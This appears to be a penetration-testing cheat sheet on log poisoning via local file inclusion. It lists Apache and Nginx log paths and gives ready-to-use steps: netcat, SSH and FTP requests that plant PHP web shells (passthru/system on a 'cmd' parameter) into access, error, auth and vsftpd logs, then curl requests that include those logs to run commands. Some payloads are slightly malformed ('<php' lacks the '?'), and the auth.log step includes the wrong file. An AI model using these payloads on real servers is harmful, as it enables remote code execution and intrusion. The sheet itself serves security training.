# Overview
Log poisoning is a cyber-attack where adversaries manipulate systems’ log files to conceal their activities or execute malicious codes.

Log poisoning can usually be executed after or as a result of an **[[File Inclusions#Basic]|LFI]]** vulnerability.

# /var/log/apache2/access.log
## Variations

| Operating System / Distro             | Web Server | Access Log File Location             |
|--------------------------------------|------------|--------------------------------------|
| RHEL / Red Hat / CentOS / Fedora     | Apache     | `/var/log/httpd/access_log`          |
| Debian / Ubuntu                      | Apache     | `/var/log/apache2/access.log`        |
| FreeBSD                              | Apache     | `/var/log/httpd-access.log`          |
| Windows                              | Apache     | `C:\xampp\apache\logs`               |
| Linux                                 | Nginx      | `/var/log/nginx/access.log`          |
| Windows                              | Nginx      | `C:\nginx\log`                        |
## Exploit
```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: $TARGET_IP
Connection: close

# Accessing the log file via LFI
curl --user-agent "USER_AGENT" <URL>/?PARAMETER=/var/log/apache2/access.log&cmd=id
```


# /var/log/apache2/error.log

## Variations
| Operating System / Distro             | Web Server | Error Log File Location              |
|--------------------------------------|------------|--------------------------------------|
| RHEL / Red Hat / CentOS / Fedora     | Apache     | `/var/log/httpd/error_log`           |
| Debian / Ubuntu                      | Apache     | `/var/log/apache2/error.log`         |
| FreeBSD                              | Apache     | `/var/log/httpd-error.log`           |
| Windows                              | Apache     | `C:\xampp\apache\logs`               |
| Linux                                 | Nginx      | `/var/log/nginx`                     |
| Windows                              | Nginx      | `C:\nginx\log`                        |
## Exploit
```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: $TARGET_IP
Connection: close

# Accessing the log file via LFI
curl --user-agent "USER_AGENT" <URL>/?PARAMETER=/var/log/apache2/error.log&cmd=id
```



# /var/log/auth.log
When trying to login via SSH the attempt will be logged in the log file. With **[[File Inclusions#Basic]|LFI]]** allows the attacker to query the file where the command queried during the SSH login is then seen.
```bash
# Sending the payload via SSH
ssh '<php phpinfo(); ?>'@$TARGET

# Accessing the log file via LFI
curl --user-agent "USER_AGENT" <URL>/?PARAMETER=/var/log/apache2/error.log&cmd=id
```


# /var/log/vsftpd.log
If [[21 - FTP]] is available then you can try to access the log file. If the content is displayed then you might be able to send a crafted payload to the server, which will then be echoed to the file.
```bash
# Sending the payload via FTP
ftp $TARGET_IP
'<php system($_GET['cmd'])?>'

# Accessing the log file via LFI
curl --user-agent "USER_AGENT" <URL>/?PARAMETER=/var/log/vsftpd.log&cmd=id
```


# References
- [https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning)
- [https://ieeexplore.ieee.org/document/10623179](https://ieeexplore.ieee.org/document/10623179)
- [https://owasp.org/www-community/attacks/Log_Injection](https://owasp.org/www-community/attacks/Log_Injection)